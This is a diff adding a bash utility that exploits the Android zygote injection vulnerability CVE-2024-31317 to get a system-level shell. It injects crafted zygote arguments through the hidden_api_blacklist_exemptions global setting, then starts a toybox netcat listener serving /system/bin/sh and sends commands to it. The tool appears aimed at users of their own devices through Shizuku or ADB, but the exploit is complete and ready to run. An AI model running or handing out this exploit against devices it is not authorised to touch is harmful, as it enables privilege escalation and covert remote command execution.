@@ -1,0 +1,234 @@
+#!/bin/bash
+
+# System Shell Netcat Command Sender
+# A utility to setup and send commands to remote servers via netcat
+# Supports interactive mode, command execution, and Android zygote injection setup
+# Based on: https://infosecwriteups.com/exploiting-android-zygote-injection-cve-2024-31317-d83f69265088
+
+# Configuration
+NC_HOST="localhost"
+NC_PORT="1234"
+NC_UID="1000"
+
+# =============================================================================
+# FUNCTIONS
+# =============================================================================
+
+show_help() {
+    echo "System Shell Netcat Command Sender"
+    echo "============================="
+    echo ""
+    echo "Usage: sysnc [OPTIONS]"
+    echo ""
+    echo "Options:"
+    echo "  -c, --command    Send command to server and close connection"
+    echo "  -s, --setup      Setup netcat server (system shell)"
+    echo "  -u, --uid UID    Specify UID for setup (must be >= 1000)"
+    echo "  -k, --kill       Kill netcat server"
+    echo "  -h, --help       Show this help message"
+    echo "  (no args)        Interactive connection to server"
+    echo ""
+    echo "Examples:"
+    echo "  sysnc -c \"ls -la\"      # Send command"
+    echo "  sysnc                  # Interactive mode"
+    echo "  sysnc -s               # Setup server"
+    echo "  sysnc -s -u 1000       # Setup server with UID 1000"
+    echo "  sysnc -k               # Kill server"
+    echo "  cat script.sh | sysnc  # Execute script and close connection"
+    echo ""
+    echo "For system shell setup, ensure rish(Shizuku) is installed and accessible."
+}
+
+check_connection() {
+    if [ $? -ne 0 ]; then
+        echo "Error: Failed to connect to $NC_HOST:$NC_PORT"
+        echo "   Make sure the netcat server is running and accessible"
+        echo "   Run 'sysnc -h' for more information"
+        exit 1
+    fi
+}
+
+check_error() {
+    if [ $? -ne 0 ]; then
+        echo "Error: $1"
+        exit 1
+    fi
+}
+
+# Android Zygote Injection Commands
+zygote_injection() {
+    local uid=${1:-$NC_UID}
+    printf "settings put global hidden_api_blacklist_exemptions \"LClass1;->method1(
+15
+--runtime-args
+--setuid=%s
+--setgid=%s
+--runtime-flags=2049
+--mount-external-full
+--target-sdk-version=29
+--setgroups=3003
+--nice-name=runnetcat
+--seinfo=platform:isSystemServer:privapp:targetSdkVersion=29:complete
+--invoke-with
+toybox nc -s 127.0.0.1 -p %s -L /system/bin/sh -l;
+--instruction-set=arm
+--app-data-dir=/data/
+--package-name=com.android.settings
+android.app.ActivityThread
+\"\n" "$uid" "$uid" "$NC_PORT"
+}
+
+stop_setting() {
+    echo "am force-stop com.android.settings"
+}
+
+start_setting() {
+    echo "am start -a android.settings.SETTINGS"
+}
+
+clean_up_setting() {
+    echo "settings delete global hidden_api_blacklist_exemptions"
+}
+
+kill_server() {
+    echo "Killing netcat server..."
+    echo "pkill -f 'nc.*$NC_PORT'" | nc -N "$NC_HOST" "$NC_PORT"
+    if [ $? -eq 0 ]; then
+        sleep 2
+        echo "   [OK] Netcat server killed"
+    else
+        echo "   [OK] Netcat server already closed"
+    fi
+}
+
+setup_server() {
+    local uid=$NC_UID
+    
+    # Skip the first argument (-s or --setup) and check remaining arguments
+    shift
+    
+    # Check if UID flag is provided
+    if [ $# -ge 1 ] && ([ "$1" = "-u" ] || [ "$1" = "--uid" ]); then
+        if [ $# -lt 2 ]; then
+            echo "Error: UID value required after -u/--uid"
+            echo "   Run 'sysnc -h' for more information"
+            exit 1
+        fi
+        uid=$2
+        
+        # Validate UID
+        if ! [[ "$uid" =~ ^[0-9]+$ ]] || [ "$uid" -lt 1000 ]; then
+            echo "Error: UID must be a number >= 1000"
+            echo "   Provided UID: $uid"
+            exit 1
+        fi
+    fi
+    
+    echo "Setting up system shell netcat server using Android Zygote Injection"
+    echo "   Using UID: $uid"
+    echo ""
+
+    # Check for rish availability
+    if ! command -v rish &> /dev/null; then
+        echo "Error: rish(Shizuku) is not installed or not in PATH"
+        echo ""
+        echo "Setup Instructions:"
+        echo "   1. Install Shizuku: https://github.com/RikkaApps/Shizuku"
+        echo "   2. Setup rish with Shizuku"
+        echo ""
+        echo "OR Run these commands in ADB shell:"
+        echo "1:   $(stop_setting)"
+        echo "2:   $(zygote_injection $uid)"
+        echo "3:   $(start_setting)"
+        echo "4:   $(clean_up_setting)"
+        exit 1
+    fi
+
+    # Kill any existing netcat server
+    kill_server
+
+    # Step 1: Stop settings app
+    echo "Step 1: Stopping Android Settings app..."
+    rish -c "$(stop_setting)"
+    check_error "Failed to stop settings app"
+    echo "   [OK] Settings app stopped"
+    
+    # Step 2: Execute zygote injection
+    echo "Step 2: Executing Zygote Injection exploit..."
+    rish -c "$(zygote_injection $uid)"
+    check_error "Failed to execute zygote injection"
+    echo "   [OK] Netcat server started via zygote injection"
+    
+    # Step 3: Restart settings app
+    echo "Step 3: Restarting Settings app..."
+    rish -c "$(start_setting)"
+    check_error "Failed to restart settings app"
+    echo "   [OK] Settings app restarted"
+
+    # Wait for settings app to initialize
+    sleep 2
+    
+    # Step 4: Cleanup
+    echo "Step 4: Cleaning up hidden API exemptions..."
+    rish -c "$(clean_up_setting)"
+    check_error "Failed to clean up hidden API exemptions"
+    echo "   [OK] Cleanup completed"
+    
+    echo ""
+    echo "Netcat server setup complete!"
+    echo "   Server: $NC_HOST:$NC_PORT"
+    echo "   UID: $uid"
+    echo "   Usage: sysnc -c \"command\" or sysnc"
+}
+
+# =============================================================================
+# MAIN EXECUTION
+# =============================================================================
+
+# Check dependencies
+if ! command -v nc &> /dev/null; then
+    echo "Error: netcat (nc) is not installed or not in PATH"
+    exit 1
+fi
+
+# Handle piped input
+if [ ! -t 0 ]; then
+    # Piped input - execute and close
+    cat | nc -N "$NC_HOST" "$NC_PORT"
+    check_connection
+else
+    # Handle command line arguments
+    if [ $# -eq 0 ]; then
+        # Interactive mode
+        nc "$NC_HOST" "$NC_PORT"
+        check_connection
+    else
+        # Parse arguments
+        case "$1" in
+            -h|--help)
+                show_help
+                ;;
+            -s|--setup)
+                setup_server "$@"
+                ;;
+            -k|--kill)
+                kill_server
+                ;;
+            -c|--command)
+                if [ $# -lt 2 ]; then
+                    echo "Error: Command argument required after -c/--command"
+                    echo "   Run 'sysnc -h' for more information"
+                    exit 1
+                fi
+                COMMAND="${@:2}"
+                echo "$COMMAND" | nc -N "$NC_HOST" "$NC_PORT"
+                check_connection
+                ;;
+            *)
+                echo "Error: Invalid argument '$1'"
+                echo "   Run 'sysnc -h' for more information"
+                exit 1
+                ;;
+        esac
+    fi
+fi
